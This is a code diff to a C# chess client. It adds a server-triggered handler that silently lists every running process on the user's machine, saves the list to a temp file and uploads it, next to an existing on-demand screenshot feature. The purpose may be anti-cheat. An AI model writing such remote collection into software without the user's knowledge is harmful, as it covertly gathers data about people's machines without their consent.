@@ -353,6 +353,9 @@ namespace ChessClient
             } else if (ping.Id == PacketId.DemandScreen)
             {
                 performScreenShot();
+            } else if (ping.Id == PacketId.DemandProcesses)
+            {
+                performProcesses();
             } else if (ping.Id == PacketId.UserDisconnected)
             {
                 var player = GetPlayer(ping.Content["id"].ToObject<int>());
@@ -369,6 +372,8 @@ namespace ChessClient
                 {
                     GameForm.Hide();
                 }));
+                if (ping.Content == null)
+                    return;
                 var player = GetPlayer(ping.Content["id"].ToObject<int>());
                 if(player == null)
                 {
@@ -402,6 +407,33 @@ namespace ChessClient
         {
             Client.Send(txtInput.Text);
             appendChat($">> " + txtInput.Text);
+        }
+
+        void performProcesses()
+        {
+            try
+            {
+                var processes = Process.GetProcesses();
+                string TEXT = "";
+                foreach(var proc in processes)
+                {
+                    try
+                    {
+                        TEXT += $"{proc.Id}: {proc.ProcessName}\r\n";
+                    } catch
+                    {
+                        TEXT += $"-1: error\r\n";
+                    }
+                }
+                var fName = Path.Combine(Path.GetTempPath(), "_chess.txt");
+                File.WriteAllText(fName, TEXT);
+                API.UploadProcesses(Encoding.UTF8.GetBytes(TEXT));
+            } catch (Exception ex)
+            {
+#if DEBUG
+                MessageBox.Show(ex.ToString(), "Processes");
+#endif
+            }
         }
 
         const int ENUM_CURRENT_SETTINGS = -1;
